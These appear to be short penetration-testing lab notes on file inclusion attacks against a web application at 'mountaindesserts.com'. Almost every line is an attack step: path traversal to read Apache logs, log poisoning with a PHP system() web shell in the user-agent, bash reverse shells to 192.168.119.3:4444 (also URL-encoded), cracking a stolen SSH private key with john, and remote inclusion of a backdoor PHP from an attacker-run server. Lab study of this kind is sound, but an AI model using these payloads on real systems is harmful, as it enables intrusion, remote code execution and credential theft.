### Local File Inclusion

```
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```

Modify user-agent by adding <?php echo system($_GET['cmd']); ?>

bash -i >& /dev/tcp/192.168.119.3/4444 0>&1

bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"

bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22

```
/home/daniela/.ssh/id_rsa
ssh2john id_rsa > ssh.hash 
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
ssh -i id_rsa daniela@192.168.50.244
```

### Remote File Inclusion

- RFI vulnerabilities allow us to include files from a remote system over HTTP1 or SMB.

python3 -m http.server 80
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"

